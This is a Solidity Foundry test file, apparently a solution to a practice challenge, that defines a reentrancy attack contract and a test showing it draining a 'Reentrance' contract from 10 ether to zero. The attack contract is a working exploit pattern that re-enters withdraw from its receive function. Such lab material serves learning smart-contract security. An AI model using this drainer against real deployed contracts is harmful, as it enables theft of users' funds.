// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {Reentrance} from "../src/Reentrancy.sol";

contract ReentranceAttack {
    Reentrance rt;

    constructor(Reentrance _rt) public {
        rt = Reentrance(_rt);
    }

    receive() external payable {
        if (address(rt).balance >= 1 ether) {
            rt.withdraw(1 ether);
        }
    }

    function exploit() public payable {
        require(msg.value == 1 ether, "Require 1 Ether to attack");
        rt.donate{value: msg.value}(address(this));
        rt.withdraw(msg.value);
    }
}

contract ReentranceTest is Test {
    Reentrance public rt;
    ReentranceAttack public rtAttack;

    address alice = address(1);

    function setUp() public {
        vm.prank(alice);
        rt = new Reentrance();
        rtAttack = new ReentranceAttack(rt);
        deal(address(rt), 10 ether);
    }

    function testAttack() public {
        assertEq(address(rt).balance, 10 ether);

        rtAttack.exploit{value: 1 ether}();

        assertEq(address(rt).balance, 0 ether);
        assertEq(address(rtAttack).balance, 11 ether);
    }
}
